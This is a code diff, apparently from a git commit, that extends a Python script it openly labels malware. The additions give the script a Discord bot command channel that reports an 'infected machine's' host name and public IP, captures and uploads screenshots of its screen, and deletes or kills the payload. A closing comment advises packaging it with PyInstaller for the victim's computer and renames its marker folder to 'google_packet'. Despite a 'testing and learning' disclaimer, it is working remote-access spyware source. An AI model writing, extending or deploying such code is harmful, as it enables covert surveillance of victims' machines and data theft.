@@ -1,3 +1,9 @@
+# VERY IMPORTANT
+# THIS IS VERY CLEARLY MALWARE!!!
+# DO NOT USE IT AS SUCH.
+# THIS CODE IS ONLY FOR TESTING AND LEARNING!
+# IF YOU INSTALL THIS ON SOMEONE ELSE’S MACHINE YOU WILL HAVE JUST COMMITTED:
+# A FELONY
 import os
 import requests
 import dotenv
@@ -32,7 +38,7 @@ public_ip_address = requests.get('https://api.ipify.org').text
 boot_timestamp = time.time()
 boot_time_str = datetime.datetime.fromtimestamp(boot_timestamp).strftime("%Y-%m-%d %H:%M:%S")
 
-if os.path.isdir("user_run"):
+if os.path.isdir("google_packet"):
     embed = {
         "title": f"System Boot - {host_name}",
         "color": 0x808080,
@@ -62,6 +68,89 @@ else:
 discord_post(embed)
 
 try:
-    os.makedirs("user_run", exist_ok=True)
+    os.makedirs("google_packet", exist_ok=True)
 except Exception as e:
     debug_print(f"[Error] Failed to make dir: {e}")
+
+import discord
+from discord.ext import commands
+
+intents = discord.Intents.all()
+intents.message_content = True
+
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+@bot.event
+async def on_ready():
+    print(f"Bot logged in as {bot.user}")
+
+@bot.command()
+async def ping(ctx):
+    await ctx.send(f"Pong! ({public_ip_address})")
+
+@bot.command()
+async def run(ctx):
+    await ctx.send("Starting your process now!")
+
+@bot.command()
+async def kill(ctx):
+    global infected_ip
+    if not infected_ip:
+        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
+        return
+    file_path = "./Downloads/main.exe"
+
+    try:
+        os.remove(file_path)
+        print(f"{file_path} has been deleted.")
+    except FileNotFoundError:
+        print(f"{file_path} not found, nothing to delete.")
+    except Exception as e:
+        print(f"Error deleting {file_path}: {e}")
+
+    await ctx.send(f"Killing script on {host_name}/{public_ip_address}")
+
+import io
+
+@bot.command()
+async def screenshot(ctx):
+    global infected_ip
+    if not infected_ip:
+        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
+        return
+    import pyautogui
+    screenshot = pyautogui.screenshot()
+    
+    with io.BytesIO() as image_binary:
+        screenshot.save(image_binary, 'PNG')
+        image_binary.seek(0)
+        await ctx.send(file=discord.File(fp=image_binary, filename='screenshot.png'))
+
+@bot.command()
+async def shutdown(ctx):
+    global infected_ip
+    if not infected_ip:
+        await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
+        return
+    os._exit()
+    await ctx.send(f"Sent shutdown to {host_name}/{infected_ip}")
+
+
+@bot.command()
+async def infected_machine_ip(ctx, ip: str):
+    import ipaddress
+    global infected_ip
+    try:
+        ipaddress.ip_address(ip)
+        infected_ip = ip
+        await ctx.send(f"Infected machine IP set to: {infected_ip}")
+    except ValueError:
+        await ctx.send("❌ Invalid IP address.")
+
+@bot.command()
+@commands.has_permissions(manage_messages=True)
+async def purge_channel(ctx, amount: int = 100):
+    deleted = await ctx.channel.purge(limit=amount + 1)
+    await ctx.send(f"✅ Deleted {len(deleted) - 1} messages.", delete_after=3)
+
+bot.run(os.getenv("BOT_TOKEN")) #USE AT YOUR OWN RISK!!!!!! YOU MAY NEED TO SETUP A SEPERATE SERVER TO AVOID EXPOSING YOUR TOKEN TO THE INFECTED COMPUTER. OTHERWISE PUT THE TOKEN THERE THEN PYINSTALLER IT!!!!!
